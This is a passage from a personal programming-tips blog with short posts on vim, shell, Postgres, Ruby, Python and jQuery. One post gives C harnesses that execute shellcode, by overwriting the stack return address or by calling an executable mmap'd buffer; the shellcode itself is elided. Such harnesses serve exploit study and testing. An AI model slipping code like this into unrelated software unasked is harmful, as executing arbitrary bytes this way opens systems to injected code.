<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">trap</span><span class="p">(</span><span class="s1">&#39;PIPE&#39;</span><span class="p">,</span> <span class="s1">&#39;EXIT&#39;</span><span class="p">)</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/tail/">tail</a></h2>
      <time>Oct 16, 2013</time>
      <p>I didn&rsquo;t know tail could be used to skip lines in a file:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">Numbers having a leading plus (`+&#39;) sign are relative to the beginning of the input</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># skip first line, start from second line
</span><span class="c1"></span>tail -n+2 file</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/delay-jquery-hover-event/">delay jquery hover event</a></h2>
      <time>Oct 16, 2013</time>
      <p>Suppose you&rsquo;d like to perform an event when the user hovers over an item, but
you&rsquo;d like that event to be slightly delayed to reduce sensitivity to
inadvertent mouse movements.</p>

<p>To solve this problem you can decompose the hover action into a <code>mouseenter</code>
and <code>mouseleave</code>. Then use a <code>setTimeout</code> to perform your action, but cancel
the timer if the mouse leaves too early.</p>

<p>Using an immediately invoked function closure, you can store the timer object
and clear it easily like so:</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">timer</span><span class="p">;</span>

  <span class="kd">function</span> <span class="nx">change</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">that</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">);</span> 
    <span class="nx">timer</span> <span class="o">=</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
      <span class="c1">// ...
</span><span class="c1"></span>    <span class="p">},</span> <span class="mi">200</span><span class="p">);</span> 
  <span class="p">}</span>

  <span class="kd">function</span> <span class="nx">cancel</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">clearTimeout</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;selector&#39;</span><span class="p">).</span><span class="nx">mouseenter</span><span class="p">(</span><span class="nx">change</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">mouseleave</span><span class="p">(</span><span class="nx">cancel</span><span class="p">);</span>
<span class="p">}());</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/vim-reminders/">vim reminders</a></h2>
      <time>Oct 1, 2013</time>
      <p>I always trounce my yank buffer when I delete lines. Don&rsquo;t forget that
registers 0-9 are a history of the past 10 <strong>yank buffers</strong>.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">&#34;0p    ...    &#34;9p</code></pre></div>
<p>Sometimes, when doing a global search and replace, it is convenient to be
<strong>prompted</strong> before replacing each string.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">%s/foo/bar/gc</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/postgres-index-usage/">postgres index usage</a></h2>
      <time>Sep 9, 2013</time>
      <p>Awesome article on <a href="http://www.craigkerstiens.com/2012/10/01/understanding-postgres-performance/">understanding postgres performance</a> had this little nugget, which gives you the tables in your database with the percentage of time they use an index:</p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> 
  <span class="n">relname</span><span class="p">,</span> 
  <span class="mi">100</span> <span class="o">*</span> <span class="n">idx_scan</span> <span class="o">/</span> <span class="p">(</span><span class="n">seq_scan</span> <span class="o">+</span> <span class="n">idx_scan</span><span class="p">)</span> <span class="n">percent_of_times_index_used</span><span class="p">,</span> 
  <span class="n">n_live_tup</span> <span class="n">rows_in_table</span>
<span class="k">FROM</span> 
  <span class="n">pg_stat_user_tables</span>
<span class="k">WHERE</span> 
  <span class="n">seq_scan</span> <span class="o">+</span> <span class="n">idx_scan</span> <span class="o">&gt;</span> <span class="mi">0</span> 
<span class="k">ORDER</span> <span class="k">BY</span> 
  <span class="n">n_live_tup</span> <span class="k">DESC</span><span class="p">;</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/split-screen/">split screen</a></h2>
      <time>Sep 3, 2013</time>
      <p>GNU screen allows you to split your screen session into independently operable
windows.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">CTRL + a + S                - horizontal split
CTRL + a + TAB              - change split
CTRL + a + X                - kill current split
CTRL + a + :resize N        - resize to N lines</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/readline-vi-mode/">readline vi mode</a></h2>
      <time>Jun 26, 2013</time>
      <div class="highlight"><pre class="chroma"><code class="language-vim" data-lang="vim"># <span class="p">~</span>/.<span class="nx">inputrc</span><span class="err">
</span><span class="err"></span><span class="nx">set</span> <span class="nx">editing</span><span class="p">-</span><span class="nx">mode</span> <span class="nx">vi</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/i-m-still-listening/">i&#39;m still listening </a></h2>
      <time>Jun 25, 2013</time>
      <p>I&rsquo;m always listening, Pandora.</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span> <span class="nx">$</span><span class="p">(</span><span class="s1">&#39;.still_listening&#39;</span><span class="p">).</span><span class="nx">click</span><span class="p">();</span> <span class="p">},</span> <span class="mi">1000</span><span class="p">);</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/creating-a-bootable-usb-in-mac-os-x/">creating a bootable usb in mac os x</a></h2>
      <time>Jun 24, 2013</time>
      <p>1) Convert ISO to IMG.</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">hdiutil convert -format UDRW -o /path/to/output.img /path/to/input.iso</code></pre></div>
<p>2) Unmount drive.</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">diskutil unmountDisk /dev/diskN</code></pre></div>
<p>3) Copy IMG to drive.</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">sudo dd <span class="k">if</span><span class="o">=</span>/path/to/output.img <span class="nv">of</span><span class="o">=</span>/dev/rdiskN <span class="nv">bs</span><span class="o">=</span>1m</code></pre></div>
<p>4) Eject drive.</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">diskutil eject /dev/diskN</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/shellcode-test-harnesses/">shellcode test harnesses</a></h2>
      <time>Jun 18, 2013</time>
      <p>On the <strong>stack</strong>:</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span> <span class="o">=</span> <span class="sa"></span><span class="s">&#34;...</span><span class="se">\xCD\x80</span><span class="s">&#34;</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="o">*</span><span class="n">ret</span><span class="p">;</span>
  <span class="n">ret</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ret</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span>
  <span class="o">*</span><span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="n">sc</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></div>
<p>On the <strong>heap</strong>:</p>
<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">sc</span><span class="p">[]</span> <span class="o">=</span> <span class="sa"></span><span class="s">&#34;&#34;</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
  <span class="c1">// mmap(NULL, size, 7, 34, -1, 0);
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">sc</span><span class="p">),</span> <span class="n">PROT_EXEC</span><span class="o">|</span><span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_PRIVATE</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> 
  <span class="n">memcpy</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="n">sc</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">sc</span><span class="p">));</span>
  <span class="p">((</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">map</span><span class="p">)();</span>
<span class="p">}</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/vim-autocomplete/">vim autocomplete</a></h2>
      <time>Jun 10, 2013</time>
      <p>VIM has word auto-completion built-in,  press <strong>CTRL+n</strong> while in Insert mode:</p>

<p><img src="/img/vimautocomplete.png" style="width:100%" alt="vim autocomplete"/></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/map-reduce-a-csv-file/">map reduce a csv file</a></h2>
      <time>Jun 8, 2013</time>
      <p>Map-reduce a CSV files using the incredible UNIX <strong>sort</strong> utility in just
~24 LOC.</p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># kwarrick@uga.edu</span>
<span class="kn">import</span> <span class="nn">csv</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">groupby</span>

<span class="k">def</span> <span class="nf">map_reduce_csv</span><span class="p">(</span><span class="n">mapper</span><span class="p">,</span> <span class="n">reducer</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">):</span>
  <span class="sa"></span><span class="s2">&#34;&#34;&#34; Map-reduce CSV file using UNIX sort utility. &#34;&#34;&#34;</span>
  <span class="n">sort</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span>
    <span class="p">[</span><span class="sa"></span><span class="s1">&#39;/usr/bin/sort&#39;</span><span class="p">,</span> <span class="sa"></span><span class="s1">&#39;-t,&#39;</span><span class="p">],</span> 
    <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="sa"></span><span class="s1">&#39;LC_ALL&#39;</span><span class="p">:</span> <span class="sa"></span><span class="s1">&#39;C&#39;</span><span class="p">},</span>
    <span class="n">stdin</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
    <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
  <span class="p">)</span>

  <span class="c1"># map and sort</span>
  <span class="n">reader</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">reader</span><span class="p">(</span><span class="n">infile</span><span class="p">)</span>
  <span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">writer</span><span class="p">(</span><span class="n">sort</span><span class="o">.</span><span class="n">stdin</span><span class="p">,</span> <span class="n">quoting</span><span class="o">=</span><span class="n">csv</span><span class="o">.</span><span class="n">QUOTE_NONE</span><span class="p">)</span>

  <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">reader</span><span class="p">:</span>
    <span class="n">writer</span><span class="o">.</span><span class="n">writerows</span><span class="p">(</span><span class="n">mapper</span><span class="p">(</span><span class="n">row</span><span class="p">))</span>

  <span class="n">sort</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

  <span class="c1"># group and reduce</span>
  <span class="n">reader</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">reader</span><span class="p">(</span><span class="n">sort</span><span class="o">.</span><span class="n">stdout</span><span class="p">)</span>
  <span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">writer</span><span class="p">(</span><span class="n">outfile</span><span class="p">,</span> <span class="n">quoting</span><span class="o">=</span><span class="n">csv</span><span class="o">.</span><span class="n">QUOTE_NONE</span><span class="p">)</span>

  <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">groupby</span><span class="p">(</span><span class="n">reader</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
    <span class="n">writer</span><span class="o">.</span><span class="n">writerows</span><span class="p">(</span><span class="n">reducer</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="nb">list</span><span class="p">(</span><span class="n">v</span><span class="p">)))</span>

  <span class="n">sort</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">identity</span><span class="p">(</span><span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">):</span>
  <span class="sa"></span><span class="s2">&#34;&#34;&#34; Example task simply outputs sorted input file. &#34;&#34;&#34;</span>
  <span class="k">def</span> <span class="nf">key</span><span class="p">(</span><span class="n">row</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
      
  <span class="k">def</span> <span class="nf">mapper</span><span class="p">(</span><span class="n">row</span><span class="p">):</span>
    <span class="k">yield</span> <span class="n">row</span>

  <span class="k">def</span> <span class="nf">reducer</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">values</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">values</span><span class="p">:</span>
      <span class="k">yield</span> <span class="n">value</span>

  <span class="n">map_reduce_csv</span><span class="p">(</span><span class="n">mapper</span><span class="p">,</span> <span class="n">reducer</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">infile</span><span class="p">,</span> <span class="n">outfile</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="sa"></span><span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
  <span class="kn">import</span> <span class="nn">fileinput</span>
  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa"></span><span class="s1">&#39;output.csv&#39;</span><span class="p">,</span> <span class="sa"></span><span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
    <span class="n">identity</span><span class="p">(</span><span class="n">fileinput</span><span class="o">.</span><span class="nb">input</span><span class="p">(),</span> <span class="n">outfile</span><span class="p">)</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/parsing-dns-messages-with-ruby/">parsing DNS messages with ruby</a></h2>
      <time>Jun 7, 2013</time>
      <p>Ruby&rsquo;s core module, <code>resolv</code>, will allow you to easily parse raw DNS messages:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="nb">require</span> <span class="s1">&#39;resolv&#39;</span>

<span class="no">Resolv</span><span class="o">::</span><span class="no">DNS</span><span class="o">::</span><span class="no">Message</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\xE8\x84\x81\x80</span><span class="s2">...&#34;</span><span class="p">)</span>

<span class="n">msg</span><span class="o">.</span><span class="n">opcode</span>
<span class="c1"># =&gt; 0 </span>

<span class="n">msg</span><span class="o">.</span><span class="n">question</span> 
<span class="c1"># =&gt; [[#&lt;Resolv::DNS::Name: segv.me.&gt;, Resolv::DNS::Resource::IN::A]]</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/postgres-database-and-table-size/">postgres database and table size</a></h2>
      <time>Jun 5, 2013</time>
      <div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span> <span class="n">pg_size_pretty</span><span class="p">(</span><span class="n">pg_database_size</span><span class="p">(</span><span class="s1">&#39;foo_db&#39;</span><span class="p">));</span>
<span class="k">SELECT</span> <span class="n">pg_size_pretty</span><span class="p">(</span><span class="n">pg_total_relation_size</span><span class="p">(</span><span class="s1">&#39;bar_table&#39;</span><span class="p">));</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/visual-block-mode/">visual block mode</a></h2>
      <time>Jun 4, 2013</time>
      <div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">Multi-line text insert:
1. CTRL + V (select column)
2. SHIFT + i (insert)
3. type text
4. ESC</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">Multi-line text append:
1. CTRL + V (select lines)
2. $ (extend block to end of lines)
2. SHIFT + a (append)
3. type text
4. ESC</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/how-long-is-the-linux-kernel-in-miles/">how long is the linux kernel, in miles?</a></h2>
      <time>Apr 24, 2013</time>
      <p>So, if we count the bytes in each .h, .s, and .c file what do we get?</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">find . -iname <span class="s1">&#39;*.c&#39;</span> -o -iname <span class="s1">&#39;*.h&#39;</span> -o -iname <span class="s1">&#39;*.s&#39;</span> -exec wc -c <span class="o">{}</span> <span class="se">\;</span> <span class="se">\
</span><span class="se"></span>  <span class="p">|</span> ruby -n -e <span class="se">\
</span><span class="se"></span>    <span class="s2">&#34;puts ARGF.reduce(0) { |acc,val| acc + val.split.first.chomp.to_i }&#34;</span>
# <span class="m">9190080</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">(</span><span class="m">12</span> + <span class="m">2</span><span class="o">)</span>  /  <span class="m">300</span>.0 * <span class="m">9190080</span> / <span class="m">12</span>.0 / <span class="m">5280</span>.0
px font + px kerning / dpi * characters / foot  / mile</code></pre></div>
<p>Approximately <b>6.7 miles</b>, maybe?</p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/save-breakpoints-to-file-in-gdb/">save breakpoints to file in gdb</a></h2>
      <time>Apr 21, 2013</time>
      <p>It took me entirely too long to look this up, but you can store your
breakpoints to a file and restore them with the following commands:</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">save breakpoints [filename]
source [filename]</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/working-with-large-web-resources-in-python/">working with large web resources in python</a></h2>
      <time>Apr 15, 2013</time>
      <p>Saving the file to disk.<sup class="footnote-ref" id="fnref:1"><a rel="footnote" href="#fn:1">1</a></sup></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">urllib2</span>
<span class="kn">import</span> <span class="nn">shutil</span>

<span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="sa"></span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
  <span class="n">shutil</span><span class="o">.</span><span class="n">copyfileobj</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">f</span><span class="p">)</span></code></pre></div>
<p>Reading GZIP compressed CSV files:<sup class="footnote-ref" id="fnref:2"><a rel="footnote" href="#fn:2">2</a></sup></p>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">csv</span>
<span class="kn">import</span> <span class="nn">gzip</span>

<span class="k">with</span> <span class="n">gzip</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
  <span class="n">reader</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">reader</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">quoting</span><span class="o">=</span><span class="n">csv</span><span class="o">.</span><span class="n">QUOTE_NONE</span><span class="p">)</span>
  <span class="n">header</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="nb">next</span><span class="p">()</span>
  <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">reader</span><span class="p">:</span>
    <span class="n">entry</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="nb">zip</span><span class="p">(</span><span class="n">header</span><span class="p">,</span> <span class="n">row</span><span class="p">))</span>
    <span class="c1"># ...</span></code></pre></div><div class="footnotes">

<hr />

<ol>
<li id="fn:1"><a href="http://stackoverflow.com/questions/9252812/using-csvreader-against-a-gzipped-file-in-python">http://stackoverflow.com/questions/9252812/using-csvreader-against-a-gzipped-file-in-python</a>
 <a class="footnote-return" href="#fnref:1"><sup>[return]</sup></a></li>
<li id="fn:2"><a href="http://stackoverflow.com/questions/1517616/stream-large-binary-files-with-urllib2-to-file">http://stackoverflow.com/questions/1517616/stream-large-binary-files-with-urllib2-to-file</a>
 <a class="footnote-return" href="#fnref:2"><sup>[return]</sup></a></li>
</ol>
</div>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/metaclass-eigenclass-virtual-class/">metaclass / eigenclass / virtual class</a></h2>
      <time>Apr 10, 2013</time>
      <div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="k">class</span> <span class="nc">Object</span>
  <span class="k">def</span> <span class="nc"></span><span class="o"></span><span class="nf">metaclass</span>
    <span class="k">class</span> <span class="o">&lt;&lt;</span> <span class="nb">self</span>
      <span class="nb">self</span> 
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">end</span></code></pre></div>
<p>A few must read posts about metaprogramming in Ruby:</p>

<ul>
<li><a href="http://dannytatom.me/metaid/">http://dannytatom.me/metaid/</a></li>
<li><a href="http://rubylearning.com/blog/2010/11/30/how-do-i-build-dsls-with-yield-and-instance_eval/">http://rubylearning.com/blog/2010/11/30/how-do-i-build-dsls-with-yield-and-instance_eval/</a></li>
<li><a href="http://yehudakatz.com/2009/11/15/metaprogramming-in-ruby-its-all-about-the-self/">http://yehudakatz.com/2009/11/15/metaprogramming-in-ruby-its-all-about-the-self/</a></li>
<li><a href="http://madebydna.com/all/code/2011/06/24/eigenclasses-demystified.html">http://madebydna.com/all/code/2011/06/24/eigenclasses-demystified.html</a></li>
</ul>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/markers-in-vim/">markers in vim</a></h2>
      <time>Mar 28, 2013</time>
      <p>Just started using markers in VIM to quickly navigate to places in my code.</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">mr        - set marker r, where r can be a-z
&#39;r        - jump to mark stored in register r, beginning of line
`r        - jump to position stored in register r, exact position</code></pre></div>
<p>New or aspiring VIM users like myself should read these:</p>

<ul>
<li><a href="http://yanpritzker.com/2011/12/16/learn-to-speak-vim-verbs-nouns-and-modifiers/">http://yanpritzker.com/2011/12/16/learn-to-speak-vim-verbs-nouns-and-modifiers/</a></li>
<li><a href="http://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim/1220118#1220118">http://stackoverflow.com/questions/1218390/what-is-your-most-productive-shortcut-with-vim/1220118#1220118</a></li>
</ul>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/zsh-automatically-report-time-stats-for-long-processes/">zsh automatically report time stats for long processes</a></h2>
      <time>Mar 24, 2013</time>
      <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="nb">export</span> <span class="nv">REPORTTIME</span><span class="o">=</span><span class="m">60</span></code></pre></div>
<p>Setting the variable <code>REPORTTIME</code> to a value greater
than zero will make ZSH automatically print execution times after the command
finishes.</p>

<blockquote>
<p>If nonzero, commands whose combined user and system execution times (measured
in seconds) are greater than this value have timing statistics printed for
them.</p>
</blockquote>

<p><a href="http://zsh.sourceforge.net/Doc/Release/Parameters.html#index-REPORTTIME">http://zsh.sourceforge.net/Doc/Release/Parameters.html#index-REPORTTIME</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/reduce-jpg-size/">reduce jpg size</a></h2>
      <time>Feb 19, 2013</time>
      <div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">convert original.jpeg -define jpeg:extent<span class="o">=</span>2048kb output.jpg</code></pre></div>
<p><a href="http://stackoverflow.com/questions/6917219/imagemagick-scale-jpeg-image-with-a-maximum-file-size">http://stackoverflow.com/questions/6917219/imagemagick-scale-jpeg-image-with-a-maximum-file-size</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/unpacking-a-list-of-items-from-an-array-in-ruby/">unpacking a list of items from an array in ruby</a></h2>
      <time>Feb 11, 2013</time>
      <p>I often find myself wanting a subset of a dictionary and find it unsightly
syntactically to do a series of element references as it is repetitive and can
make lines very long. Here is the example from the docs, augmented to
demonstrate my meaning:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">h</span> <span class="o">=</span> <span class="p">{</span> <span class="s2">&#34;cat&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;feline&#34;</span><span class="p">,</span> <span class="s2">&#34;dog&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;canine&#34;</span><span class="p">,</span> <span class="s2">&#34;cow&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;bovine&#34;</span><span class="p">,</span> <span class="o">...</span> <span class="p">}</span>
<span class="n">cat</span><span class="p">,</span> <span class="n">dog</span><span class="p">,</span> <span class="n">cow</span> <span class="o">=</span> <span class="n">h</span><span class="o">[</span><span class="s2">&#34;cat&#34;</span><span class="o">]</span><span class="p">,</span> <span class="n">h</span><span class="o">[</span><span class="s2">&#34;dog&#34;</span><span class="o">]</span><span class="p">,</span> <span class="n">h</span><span class="o">[</span><span class="s2">&#34;cow&#34;</span><span class="o">]</span></code></pre></div>
<p>Hashes of course have the select method allowing you to do something a little
less repetitive, but certainly not any less concise in this case, and it still
doesn&rsquo;t help us unpack the values.</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">h</span><span class="o">.</span><span class="n">select</span> <span class="p">{</span> <span class="o">|</span><span class="n">k</span><span class="p">,</span><span class="n">v</span><span class="o">|</span> <span class="sx">%w{cat dog cow}</span><span class="o">.</span><span class="n">include?</span> <span class="n">k</span> <span class="p">}</span>
<span class="c1"># =&gt; {&#34;cat&#34;=&gt;&#34;feline&#34;, &#34;dog&#34;=&gt;&#34;canine&#34;, &#34;cow&#34;=&gt;&#34;bovine&#34;} </span></code></pre></div>
<p>Well, I just found <code>value_at</code> at the bottom of the list
on Ruby&rsquo;s Hash object that does exactly what I want:</p>
<div class="highlight"><pre class="chroma"><code class="language-ruby" data-lang="ruby"><span class="n">h</span><span class="o">.</span><span class="n">values_at</span><span class="p">(</span><span class="s2">&#34;cow&#34;</span><span class="p">,</span> <span class="s2">&#34;cat&#34;</span><span class="p">)</span>  
<span class="c1">#=&gt; [&#34;bovine&#34;, &#34;feline&#34;]</span>

<span class="n">a</span> <span class="o">=</span> <span class="o">[</span><span class="s2">&#34;cat&#34;</span><span class="p">,</span> <span class="s2">&#34;dog&#34;</span><span class="o">]</span>
<span class="n">cat</span><span class="p">,</span> <span class="n">dog</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">values_at</span><span class="p">(</span><span class="o">*</span><span class="n">a</span><span class="p">)</span></code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/bit-hacks/">bit hacks</a></h2>
      <time>Feb 9, 2013</time>
      <p>Test if the n<sup>th</sup> bit is set.</p>

<pre><code>(x &amp; (1 &lt;&lt; n))
</code></pre>

<p>Set the n<sup>th</sup> bit.</p>

<pre><code>x = x | (1 &lt;&lt; n)
</code></pre>

<p>Unset the n<sup>th</sup> bit.</p>

<pre><code>x = x &amp; ~(1 &lt;&lt; n)
</code></pre>

<p>Toggle the n<sup>th</sup> bit.</p>

<pre><code>x = x ^ (1 &lt;&lt; n)
</code></pre>

<p><a href="http://www.catonmat.net/blog/low-level-bit-hacks-you-absolutely-must-know/">http://www.catonmat.net/blog/low-level-bit-hacks-you-absolutely-must-know/</a></p>

    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/comments-in-zsh/">comments in zsh</a></h2>
      <time>Feb 7, 2013</time>
      <p>By default, comments are disabled in zsh&rsquo;s interactive interpreter:</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="o">[</span>warrick@maca ~<span class="o">]</span> % <span class="c1"># comment
</span><span class="c1"></span>zsh: bad pattern: #</code></pre></div>
<p>I find this to be an incredibly annoying default, but here is how you enable
such comments:</p>
<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="o">[</span>warrick@maca ~<span class="o">]</span> % setopt interactivecomments</code></pre></div>
    </article>
  
    <article>
      <h2><a href="//warrick.io/posts/python-equivalent-to-argf-or-diamond-operator/">python equivalent to argf or diamond operator</a></h2>
      <time>Feb 3, 2013</time>
